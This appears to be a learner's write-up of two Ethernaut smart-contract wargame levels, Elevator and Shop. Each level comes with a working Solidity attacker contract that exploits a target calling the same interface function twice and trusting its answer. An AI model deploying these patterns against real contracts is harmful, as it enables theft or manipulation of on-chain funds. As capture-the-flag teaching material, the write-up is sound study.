## Day 3 View function errors

### Ethernaut #11 Elevator

The elevator has a goTo floor function that which is called twice.  The elevator is called from another contract which implements the Building interface.  

```Java
function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
```

The exploit here is that the ```isLastFloor()``` can alter the state of internal variables.  There is nothing preventing that from happening.  I have built a contract which does that.  When the second to last floor is reached the numFloors variable is modified inside the BuildingPH.  


```Java
contract BuildingPH is Building {
    uint private numFloors;
    Elevator immutable elevator;

    constructor (uint _numFloors, address _elevatorAdd) {
        require(_numFloors > 0, "the building needs to have some floors");
        elevator = Elevator(_elevatorAdd);
        numFloors = _numFloors + 1;
    }

    function isLastFloor(uint floorQ) external returns (bool) {
        if (floorQ == numFloors){
            return true;
        } else if (floorQ == numFloors - 1) {
            --numFloors;
            return false;
        } else {
            return false;
        }
    }

    // send elevator to the next floor
    function elevatorGoUp() public {
        uint elevatorLocation = elevator.floor();
        require(elevatorLocation < numFloors, "cannot go higher")
        elevator.goTo(elevatorLocation + 1);
    }
}
```


### Ethernaut #21 Shop

The goal of this exercise is the pay less for an item than a shop was expecting.  The shop has a buy() method which looks like this: 

```Java
    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
```

We also have an interface called Buyer which defines price() as a view function.  So the challenge is to make a view function that does not return the same value every time.  The key here is seeing that isSold gets set to true before .price() is called the second time.  We can use this logic to output a lower price the second time price() is called.  A solution is below.

```Java
contract BuyerPH is Buyer {
    Shop immutable shop;
    uint256 constant FAKE_PRICE = 100;
    uint256 constant REAL_PRICE = 1;

    constructor(address _shopAdd) {
        shop = Shop(_shopAdd);
    }

    function callBuy() external {
        shop.buy();
    }

    function price() external view  override returns (uint256) {
        if (shop.isSold()) {
            return REAL_PRICE;
        } else {
            return FAKE_PRICE;
        }
    }
}
```